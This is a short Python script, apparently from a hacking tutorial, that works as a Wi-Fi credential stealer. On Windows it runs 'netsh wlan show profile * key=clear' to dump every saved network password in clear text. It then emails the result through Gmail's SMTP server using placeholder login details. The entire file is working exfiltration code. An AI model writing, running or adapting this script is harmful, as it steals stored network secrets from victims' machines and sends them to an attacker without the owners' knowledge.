#!/usr/bin/env python



import subprocess, smtplib, re



def send_mail(email, password, message):

    sever = smtplib.SMTP("smtp.gmail.com", 587)

    sever.starttls()

    sever.login(email, password)

    sever.sendmail(email, email, message)

    sever.quit()





command = "netsh wlan show profile * key=clear"

#networks = subprocess.check_output(command, shell=True)

result = subprocess.check_output(command, shell=True)

#networks_names_list = re.findall("regex",networks)

send_mail("xxxxx@gmail.com", "password", result)
